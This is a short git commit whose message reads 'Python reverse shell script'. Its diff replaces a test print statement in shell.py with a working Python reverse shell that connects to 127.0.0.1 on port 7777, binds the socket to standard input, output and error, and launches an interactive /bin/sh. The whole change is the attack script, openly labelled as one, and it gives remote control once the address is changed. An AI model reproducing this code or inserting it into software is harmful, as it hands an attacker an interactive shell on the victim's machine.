0eac48c8fc062c297f946e260f964b405c055674
BlBana <xiangjiao@meili-inc.com>
2018-08-21 17:56:03 +0800

    python反弹shell脚本

--- shell.py
+++ shell.py
@@ -1,1 +1,10 @@
-print('test 111111111111111111')
+#!/usr/bin/env python
+
+import socket,subprocess,os
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect(("127.0.0.1",7777))
+os.dup2(s.fileno(),0)
+os.dup2(s.fileno(),1)
+os.dup2(s.fileno(),2)
+p=subprocess.call(["/bin/sh","-i"])
+
